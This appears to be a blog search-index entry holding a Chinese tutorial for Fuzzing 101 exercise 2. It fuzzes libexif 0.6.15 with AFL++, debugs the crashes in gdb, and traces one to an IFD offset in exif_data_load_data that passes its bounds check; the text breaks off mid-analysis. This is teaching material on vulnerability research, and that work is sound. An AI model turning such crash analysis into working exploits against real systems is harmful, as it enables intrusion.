<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Fuzzing 101-Exercise 2 - libexif</title>
      <link href="/2025/10/12/Fuzzing%20101-Exercise%202%20-%20libexif/"/>
      <url>/2025/10/12/Fuzzing%20101-Exercise%202%20-%20libexif/</url>
      
        <content type="html"><![CDATA[<h1 id="Fuzzing-101-Exercise-2-libexif"><a href="#Fuzzing-101-Exercise-2-libexif" class="headerlink" title="Fuzzing 101-Exercise 2 - libexif"></a>Fuzzing 101-Exercise 2 - libexif</h1><h2 id="下载被测软件以及检测可用性"><a href="#下载被测软件以及检测可用性" class="headerlink" title="下载被测软件以及检测可用性"></a>下载被测软件以及检测可用性</h2><p>我们不采用fuzz101给定的libexif-0_6_14，而采用libexif-0_6_15，因为libexif-0_6_14在<code>make install</code>总是报错</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span></span><br><span class="line">mkdir fuzzing_libexif &amp;&amp; <span class="built_in">cd</span> fuzzing_libexif/</span><br><span class="line">wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_15-release.tar.gz</span><br></pre></td></tr></table></figure><p>我们先查看正常编译是否可以编译</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xzvf libexif-0_6_15-release.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libexif-libexif-0_6_15-release/</span><br><span class="line">sudo apt-get install autopoint libtool gettext libpopt-dev</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=<span class="string">&quot;<span class="variable">$HOME</span>/fuzzing_libexif/install/&quot;</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>这里成功完成编译</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011121741463.png"></p><p>这里我们再安装对应库的应用程序</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span>/fuzzing_libexif</span><br><span class="line">wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz</span><br><span class="line">tar -xzvf exif-0_6_15-release.tar.gz</span><br><span class="line"><span class="built_in">cd</span> exif-exif-0_6_15-release/</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=<span class="string">&quot;<span class="variable">$HOME</span>/fuzzing_libexif/install/&quot;</span> PKG_CONFIG_PATH=<span class="variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>我们测试一下exif是否可以正常运行</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011122646839.png"></p><p>接下来我们安装种子库</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cd $HOME/fuzzing_libexif</span><br><span class="line">wget https:<span class="comment">//github.com/ianare/exif-samples/archive/refs/heads/master.zip</span></span><br><span class="line">unzip master.zip</span><br></pre></td></tr></table></figure><p>可以调用<code>$HOME/fuzzing_libexif/install/bin/exif $HOME/fuzzing_libexif/exif-samples-master/jpg/Canon_40D_photoshop_import.jpg</code>来看看功能</p><p><img src="C:/Users/Kr0emer/AppData/Roaming/Typora/typora-user-images/image-20251011123647128.png"></p><h2 id="使用AFL-插桩并fuzz"><a href="#使用AFL-插桩并fuzz" class="headerlink" title="使用AFL++插桩并fuzz"></a>使用AFL++插桩并fuzz</h2><p>现在AFL++已经统一使用afl-cc或者afl-c++作为统一的编译器了，所以我们这里直接使用afl-cc来编译。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=afl-cc</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span>/fuzzing_libexif/libexif-libexif-0_6_15-release/</span><br><span class="line">make clean</span><br><span class="line">./configure --enable-shared=no --prefix=<span class="string">&quot;<span class="variable">$HOME</span>/fuzzing_libexif/fuzz/&quot;</span></span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span>/fuzzing_libexif/exif-exif-0_6_15-release</span><br><span class="line">make clean</span><br><span class="line">./configure --enable-shared=no --prefix=<span class="string">&quot;<span class="variable">$HOME</span>/fuzzing_libexif/fuzz/&quot;</span> PKG_CONFIG_PATH=<span class="variable">$HOME</span>/fuzzing_libexif/fuzz/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>接下来我们调用afl++测试</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i <span class="variable">$HOME</span>/fuzzing_libexif/exif-samples-master/jpg/ -o <span class="variable">$HOME</span>/fuzzing_libexif/out/ -s 123 -- <span class="variable">$HOME</span>/fuzzing_libexif/fuzz/bin/exif @@</span><br></pre></td></tr></table></figure><p><img src="C:/Users/Kr0emer/AppData/Roaming/Typora/typora-user-images/image-20251011145606275.png" alt="image-20251011145606275"></p><p>这样fuzz很快跑起来了，很快就发现了漏洞</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011154349084.png"></p><p>上面的就是发现并保存的能造成crash的样例了。</p><h2 id="查找问题所在"><a href="#查找问题所在" class="headerlink" title="查找问题所在"></a>查找问题所在</h2><p>我们重新打开中断再加入-g选项以及使用-o0编译。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> CFLAGS=<span class="string">&quot;-O0 -g&quot;</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span>/fuzzing_libexif/libexif-libexif-0_6_15-release/</span><br><span class="line">make clean</span><br><span class="line">./configure --prefix=<span class="string">&quot;<span class="variable">$HOME</span>/fuzzing_libexif/debug/&quot;</span></span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span>/fuzzing_libexif/exif-exif-0_6_15-release</span><br><span class="line">make clean</span><br><span class="line">./configure --prefix=<span class="string">&quot;<span class="variable">$HOME</span>/fuzzing_libexif/debug/&quot;</span> PKG_CONFIG_PATH=<span class="variable">$HOME</span>/fuzzing_libexif/debug/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>我们试着用gdb先运行一下crash样例</p><h3 id="0号样例"><a href="#0号样例" class="headerlink" title="0号样例"></a>0号样例</h3><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011161311654.png"></p><h3 id="1号样例"><a href="#1号样例" class="headerlink" title="1号样例"></a>1号样例</h3><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011161518394.png"></p><h3 id="2号样例"><a href="#2号样例" class="headerlink" title="2号样例"></a>2号样例</h3><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011161635427.png"></p><h3 id="3号样例"><a href="#3号样例" class="headerlink" title="3号样例"></a>3号样例</h3><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011161736054.png"></p><h3 id="4号样例"><a href="#4号样例" class="headerlink" title="4号样例"></a>4号样例</h3><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011161825628.png"></p><h3 id="5号样例"><a href="#5号样例" class="headerlink" title="5号样例"></a>5号样例</h3><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011161914487.png"></p><h3 id="6号样例"><a href="#6号样例" class="headerlink" title="6号样例"></a>6号样例</h3><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011161955391.png"></p><h3 id="7号样例"><a href="#7号样例" class="headerlink" title="7号样例"></a>7号样例</h3><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011162035141.png"></p><p>我们就看上面这几个样例，可以看到分别是调用</p><p><code>exif_mnote_data_canon_load</code>和<code>exif_get_sshort</code>函数的</p><p>无论是哪个crash都是从<code>exif_loader_get_data</code>函数开始的，我们先从样例0看起</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">exif_loader_get_data (ExifLoader *loader)</span><br><span class="line">&#123;</span><br><span class="line">    ExifData *ed;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 安全性检查：如果 loader 为空，直接返回 NULL</span></span><br><span class="line">    <span class="keyword">if</span> (!loader)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用 loader 的内存分配器创建一个新的 ExifData 对象</span></span><br><span class="line">    <span class="comment">// 这样可以确保内存管理的一致性</span></span><br><span class="line">    ed = exif_data_new_mem (loader-&gt;mem);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将 loader 的日志对象关联到新创建的 ExifData</span></span><br><span class="line">    <span class="comment">// 用于记录解析过程中的调试信息或错误</span></span><br><span class="line">    exif_data_log (ed, loader-&gt;<span class="built_in">log</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 核心操作：从 loader 的原始缓冲区（buf）中加载并解析 EXIF 数据</span></span><br><span class="line">    <span class="comment">// loader-&gt;buf: 存储原始 EXIF 字节数据的缓冲区</span></span><br><span class="line">    <span class="comment">// loader-&gt;bytes_read: 缓冲区中实际读取的字节数</span></span><br><span class="line">    exif_data_load_data (ed, loader-&gt;buf, loader-&gt;bytes_read);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回解析好的、结构化的 EXIF 数据</span></span><br><span class="line">    <span class="keyword">return</span> ed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后也都是从<code>exif_data_load_data</code>函数进入的，我们详细看看<code>exif_data_load_data</code>函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exif_data_load_data</span> <span class="params">(ExifData *data, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *d_orig,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">unsigned</span> <span class="keyword">int</span> ds_orig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> l;</span><br><span class="line">ExifLong offset;</span><br><span class="line">ExifShort n;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *d = d_orig;    <span class="comment">// 工作指针，会随着解析过程移动</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ds = ds_orig, len;     <span class="comment">// 工作大小，会随着解析过程减少</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 1. 参数校验 ==========</span></span><br><span class="line"><span class="keyword">if</span> (!data || !data-&gt;priv || !d || !ds) </span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG, <span class="string">&quot;ExifData&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Parsing %i byte(s) EXIF data...\n&quot;</span>, ds);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 2. 定位 EXIF 数据起始位置 ==========</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 数据可能直接以 EXIF 头开始，也可能包含在 JPEG 文件中。</span></span><br><span class="line"><span class="comment"> * 如果不是直接的 EXIF 头，需要在 JPEG 标记中搜索 EXIF 标记 (APP1)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ds &lt; <span class="number">6</span>) &#123;</span><br><span class="line">LOG_TOO_SMALL;  <span class="comment">// 数据太小，无法包含 EXIF 头</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否直接以 EXIF 头 &quot;Exif\0\0&quot; 开始</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">memcmp</span> (d, ExifHeader, <span class="number">6</span>)) &#123;</span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG, <span class="string">&quot;ExifData&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Found EXIF header.&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 不是直接的 EXIF 头，需要在 JPEG 结构中查找</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 跳过填充字节 (0xff)</span></span><br><span class="line"><span class="keyword">while</span> ((d[<span class="number">0</span>] == <span class="number">0xff</span>) &amp;&amp; ds) &#123;</span><br><span class="line">d++;</span><br><span class="line">ds--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 JPEG 图像起始标记 (SOI: Start Of Image)</span></span><br><span class="line"><span class="keyword">if</span> (d[<span class="number">0</span>] == JPEG_MARKER_SOI) &#123;</span><br><span class="line">d++;</span><br><span class="line">ds--;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳过 APP0 段（通常是 JFIF 标记）</span></span><br><span class="line"><span class="keyword">if</span> (d[<span class="number">0</span>] == JPEG_MARKER_APP0) &#123;</span><br><span class="line">d++;</span><br><span class="line">ds--;</span><br><span class="line">l = (d[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | d[<span class="number">1</span>];  <span class="comment">// 读取段长度（大端序）</span></span><br><span class="line"><span class="keyword">if</span> (l &gt; ds)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">d += l;      <span class="comment">// 跳过整个 APP0 段</span></span><br><span class="line">ds -= l;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到 APP1 段（EXIF 数据通常在这里）</span></span><br><span class="line"><span class="keyword">if</span> (d[<span class="number">0</span>] == JPEG_MARKER_APP1)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遇到未知标记，无法继续解析</span></span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_CORRUPT_DATA,</span><br><span class="line">  <span class="string">&quot;ExifData&quot;</span>, _(<span class="string">&quot;EXIF marker not found.&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳过 APP1 标记本身</span></span><br><span class="line">d++;</span><br><span class="line">ds--;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 APP1 段的长度</span></span><br><span class="line"><span class="keyword">if</span> (ds &lt; <span class="number">2</span>) &#123;</span><br><span class="line">LOG_TOO_SMALL;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">len = (d[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | d[<span class="number">1</span>];  <span class="comment">// APP1 段长度（包含长度字段本身）</span></span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG, <span class="string">&quot;ExifData&quot;</span>,</span><br><span class="line">  <span class="string">&quot;We have to deal with %i byte(s) of EXIF data.&quot;</span>,</span><br><span class="line">  len);</span><br><span class="line">d += <span class="number">2</span>;      <span class="comment">// 跳过长度字段</span></span><br><span class="line">ds -= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 3. 验证 EXIF 头 &quot;Exif\0\0&quot; ==========</span></span><br><span class="line"><span class="keyword">if</span> (ds &lt; <span class="number">6</span>) &#123;</span><br><span class="line">LOG_TOO_SMALL;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">memcmp</span> (d, ExifHeader, <span class="number">6</span>)) &#123;</span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_CORRUPT_DATA,</span><br><span class="line">  <span class="string">&quot;ExifData&quot;</span>, _(<span class="string">&quot;EXIF header not found.&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG, <span class="string">&quot;ExifData&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Found EXIF header.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 4. 解析 TIFF 头（字节序和魔数）==========</span></span><br><span class="line"><span class="comment">// TIFF 头从 EXIF 头后开始（偏移 6）</span></span><br><span class="line"><span class="keyword">if</span> (ds &lt; <span class="number">14</span>)  <span class="comment">// 需要至少 14 字节：6(EXIF头) + 2(字节序) + 2(魔数) + 4(IFD0偏移)</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查字节序标记（偏移 6，长度 2）</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">memcmp</span> (d + <span class="number">6</span>, <span class="string">&quot;II&quot;</span>, <span class="number">2</span>))</span><br><span class="line">data-&gt;priv-&gt;order = EXIF_BYTE_ORDER_INTEL;      <span class="comment">// Intel: 小端序</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">memcmp</span> (d + <span class="number">6</span>, <span class="string">&quot;MM&quot;</span>, <span class="number">2</span>))</span><br><span class="line">data-&gt;priv-&gt;order = EXIF_BYTE_ORDER_MOTOROLA;   <span class="comment">// Motorola: 大端序</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_CORRUPT_DATA,</span><br><span class="line">  <span class="string">&quot;ExifData&quot;</span>, _(<span class="string">&quot;Unknown encoding.&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证 TIFF 魔数（偏移 8，应该是 0x002a）</span></span><br><span class="line"><span class="keyword">if</span> (exif_get_short (d + <span class="number">8</span>, data-&gt;priv-&gt;order) != <span class="number">0x002a</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 5. 解析 IFD 0（主图像目录）==========</span></span><br><span class="line"><span class="comment">// 读取 IFD 0 的偏移量（偏移 10，长度 4）</span></span><br><span class="line">offset = exif_get_long (d + <span class="number">10</span>, data-&gt;priv-&gt;order);</span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG, <span class="string">&quot;ExifData&quot;</span>, </span><br><span class="line">  <span class="string">&quot;IFD 0 at %i.&quot;</span>, (<span class="keyword">int</span>) offset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析 IFD 0 的实际数据（通常从 TIFF 头开始偏移 8 字节，即整体偏移 14）</span></span><br><span class="line"><span class="comment">// d + 6: TIFF 头起始位置</span></span><br><span class="line">exif_data_load_data_content (data, EXIF_IFD_0, d + <span class="number">6</span>, ds - <span class="number">6</span>, offset, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 6. 解析 IFD 1（缩略图目录）==========</span></span><br><span class="line"><span class="comment">// IFD 1 的偏移量存储在 IFD 0 的末尾</span></span><br><span class="line"><span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> &gt; ds) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 IFD 0 的条目数量</span></span><br><span class="line">n = exif_get_short (d + <span class="number">6</span> + offset, data-&gt;priv-&gt;order);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查数据是否足够：偏移 + 条目数(2) + 所有条目(12*n) + IFD1偏移(4)</span></span><br><span class="line"><span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> + <span class="number">12</span> * n + <span class="number">4</span> &gt; ds) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 IFD 1 的偏移量（在 IFD 0 的所有条目之后）</span></span><br><span class="line">offset = exif_get_long (d + <span class="number">6</span> + offset + <span class="number">2</span> + <span class="number">12</span> * n, data-&gt;priv-&gt;order);</span><br><span class="line"><span class="keyword">if</span> (offset) &#123;  <span class="comment">// offset 为 0 表示没有 IFD 1（没有缩略图）</span></span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG, <span class="string">&quot;ExifData&quot;</span>,</span><br><span class="line">  <span class="string">&quot;IFD 1 at %i.&quot;</span>, (<span class="keyword">int</span>) offset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安全性检查：偏移量是否合理</span></span><br><span class="line"><span class="keyword">if</span> (offset &gt; ds - <span class="number">6</span>) &#123;</span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_CORRUPT_DATA,</span><br><span class="line">  <span class="string">&quot;ExifData&quot;</span>, <span class="string">&quot;Bogus offset of IFD1.&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   exif_data_load_data_content (data, EXIF_IFD_1, d + <span class="number">6</span>, ds - <span class="number">6</span>, offset, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 7. 处理厂商特定的 MakerNote ==========</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 如果存在 EXIF_TAG_MAKER_NOTE 标签，尝试解析它。</span></span><br><span class="line"><span class="comment"> * 某些相机的 MakerNote 使用指向 IFD 之间空间的指针，</span></span><br><span class="line"><span class="comment"> * 这里是唯一能访问到那些数据的地方。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">switch</span> (exif_data_get_type_maker_note (data)) &#123;</span><br><span class="line"><span class="keyword">case</span> EXIF_DATA_TYPE_MAKER_NOTE_OLYMPUS:</span><br><span class="line"><span class="keyword">case</span> EXIF_DATA_TYPE_MAKER_NOTE_NIKON:</span><br><span class="line">data-&gt;priv-&gt;md = exif_mnote_data_olympus_new (data-&gt;priv-&gt;mem);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> EXIF_DATA_TYPE_MAKER_NOTE_PENTAX:</span><br><span class="line"><span class="keyword">case</span> EXIF_DATA_TYPE_MAKER_NOTE_CASIO:</span><br><span class="line">data-&gt;priv-&gt;md = exif_mnote_data_pentax_new (data-&gt;priv-&gt;mem);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> EXIF_DATA_TYPE_MAKER_NOTE_CANON:</span><br><span class="line">data-&gt;priv-&gt;md = exif_mnote_data_canon_new (data-&gt;priv-&gt;mem, data-&gt;priv-&gt;options);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果成功识别了 MakerNote 格式，进行解析</span></span><br><span class="line"><span class="keyword">if</span> (data-&gt;priv-&gt;md) &#123;</span><br><span class="line">exif_mnote_data_log (data-&gt;priv-&gt;md, data-&gt;priv-&gt;<span class="built_in">log</span>);</span><br><span class="line">exif_mnote_data_set_byte_order (data-&gt;priv-&gt;md,</span><br><span class="line">data-&gt;priv-&gt;order);</span><br><span class="line">exif_mnote_data_set_offset (data-&gt;priv-&gt;md,</span><br><span class="line">    data-&gt;priv-&gt;offset_mnote);</span><br><span class="line">exif_mnote_data_load (data-&gt;priv-&gt;md, d, ds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 8. 根据配置选项修复数据 ==========</span></span><br><span class="line"><span class="comment">// 如果设置了遵循 EXIF 规范的选项，自动修正不符合规范的数据</span></span><br><span class="line"><span class="keyword">if</span> (data-&gt;priv-&gt;options &amp; EXIF_DATA_OPTION_FOLLOW_SPECIFICATION)</span><br><span class="line">exif_data_fix (data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到data已经在<code>ed = exif_data_new_mem (loader-&gt;mem);</code>函数中创建好了，这里这个函数主要是对各个数据填入值。</p><ul><li><p>首先是对之前创建好的结构体进行检测，看看指针是否正常</p></li><li><p>然后对”Exif\0\0”定位，寻找到Exif头</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011195355439.png"></p><p>这里可看到头部正是Exif</p></li><li><p>然后验证Exif头，这里重复验证是由于上面寻找的时候可能走另一个分支，有可能包含在 JPEG 文件中</p></li><li><p>接下来解析TIFF头的</p><ul><li><p>首先是大小端<img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011202055067.png"></p></li><li><p>接下来是魔数，这里是调用exif_get_short，我们注意到之前有些样例正是在这个函数里崩溃的，我们仔细看了看这个函数中有两处exif_get_short，而且都在exif_mnote_data_canon_load前触发，这里大概率是相同的bug导致的，我们不妨先观察exif_get_short导致的crash的样例，我们更换样例7接着看，发现不是在此处出现crash的，我们接着跟下去</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011202234025.png"></p></li></ul></li><li><p>IFD 0解析，这里调用了exif_data_load_data_content来解析IFD 0的实际数据会写入到data-&gt;ifd[EXIF_IFD_0]中去。</p></li><li><p>解析 IFD 1，然后再次调用了exif_get_short，发现在这里出现了crash，我们仔细先检查下为什么crash我们查看一下调用函数的时候传入的参数：</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011211017494.png"></p><p>这里的rdi传入的是0x555655562f25但是我们发现这个地址无法找到是空的</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011211321137.png"></p><p>也就是说这里d + 6 + offset中一定有一个值有问题d是之前传入的，那么一定是offset出问题了。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251011211717521.png"></p><p>明显看到这里出问题了，offset明显不正常，我们看看offset是从哪里出问题的</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251012084247143.png"></p><p>我们倒回去看看发现调用<code>exif_get_long</code>前并没有给offset赋值，也就是说应该就是这个函数出了问题，我们先看看这个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">ExifLong</span></span><br><span class="line"><span class="function"><span class="title">exif_get_long</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, ExifByteOrder order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (exif_get_slong (buf, order) &amp; <span class="number">0xffffffff</span>);<span class="comment">//调用exif_get_slong获取有符号整数通过与0xffffffff进行按位与运算，将有符号数转换为无符号数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">ExifSLong</span></span><br><span class="line"><span class="function"><span class="title">exif_get_slong</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *b, ExifByteOrder order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!b) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span> (order) &#123;</span><br><span class="line">        <span class="keyword">case</span> EXIF_BYTE_ORDER_MOTOROLA:<span class="comment">//大端序</span></span><br><span class="line">                <span class="keyword">return</span> ((b[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (b[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (b[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | b[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">case</span> EXIF_BYTE_ORDER_INTEL:<span class="comment">//小端序</span></span><br><span class="line">                <span class="keyword">return</span> ((b[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) | (b[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (b[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | b[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Won&#x27;t be reached */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现这里直接算出来offset，之后</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> &gt; ds) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数有校验，但是这里为什么通过校验了？这里我们可以看到</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20251012090730919.png"></p><p>也就是说这里<strong>offset</strong>在<strong>offset + 6 + 